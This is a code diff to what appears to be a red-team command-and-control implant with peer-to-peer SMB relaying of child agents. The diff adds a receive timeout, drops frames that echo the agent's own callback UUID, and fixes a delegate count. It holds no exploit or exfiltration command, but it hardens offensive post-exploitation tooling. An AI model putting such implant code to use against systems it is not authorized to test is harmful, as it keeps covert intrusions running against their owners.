@@ -82,7 +82,9 @@ static BOOL agent_send(AgentState *state, const char *uuid, const char *binary_m
 	if (state->is_p2p_child && state->p2p_peer.active) {
 		BOOL ok = FALSE;
 		if (p2p_send(&state->p2p_peer, encoded_msg) == 0) {
-			char *reply = p2p_recv(&state->p2p_peer);
+			// A reply lost in a deep relay must time out instead of wedging the
+			// agent forever; the caller reports the failure and keeps going.
+			char *reply = p2p_recv_timeout(&state->p2p_peer, P2P_RECV_TIMEOUT_SEC);
 			if (reply != NULL) {
 				size_t rlen = MSVCRT$strlen(reply);
 				response->body = MSVCRT$malloc(rlen + 1);
@@ -461,6 +463,15 @@ BOOL perform_tasking(AgentState *state, TaskingReply *reply) {
 		}
 		tasking.delegate_count = total;
 		if (tasking.delegate_count > 0) {
+			/* Guard against relaying our own frames back into the chain: under
+			 * some relay conditions a copy of our own last request can end up
+			 * queued on a downlink (the envelope uuid matches our own). Such a
+			 * frame must never be forwarded — it makes the server echo our own
+			 * request as the child's delegate reply and corrupts the round trip.
+			 * The frame is base64(uuid(36) || blob), so the first 48 chars are
+			 * exactly the base64 of our own callback uuid. */
+			char own_b64[64];
+			base64_encode(state->params.callback_uuid, 36, own_b64);
 			tasking.delegate_uuids = KERNEL32$VirtualAlloc(0, sizeof(char *) * tasking.delegate_count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
 			tasking.delegate_profiles = KERNEL32$VirtualAlloc(0, sizeof(char *) * tasking.delegate_count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
 			tasking.delegate_msgs = KERNEL32$VirtualAlloc(0, sizeof(char *) * tasking.delegate_count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
@@ -472,6 +483,18 @@ BOOL perform_tasking(AgentState *state, TaskingReply *reply) {
 				}
 				while (p->in_count > 0 && n < total) {
 					char *msg = p2p_pop_in(p);
+					/* Drop a self-echo frame (prefix compare, no strncmp import). */
+					int is_self = 1;
+					for (int k = 0; k < 48; k++) {
+						if (msg[k] != own_b64[k]) {
+							is_self = 0;
+							break;
+						}
+					}
+					if (is_self) {
+						KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
+						continue;
+					}
 					const char *uuid = (p->mythic_uuid != NULL) ? p->mythic_uuid : p->local_uuid;
 					const char *profile = (p->profile != NULL) ? p->profile : "smb";
 					tasking.delegate_uuids[n] = clone_str((char *)uuid);
@@ -480,6 +503,7 @@ BOOL perform_tasking(AgentState *state, TaskingReply *reply) {
 					n++;
 				}
 			}
+			tasking.delegate_count = n;
 		}
 		// Flush any pending edge updates (link/unlink) in the same message.
 		tasking.edge_count = state->pending_edge_count;
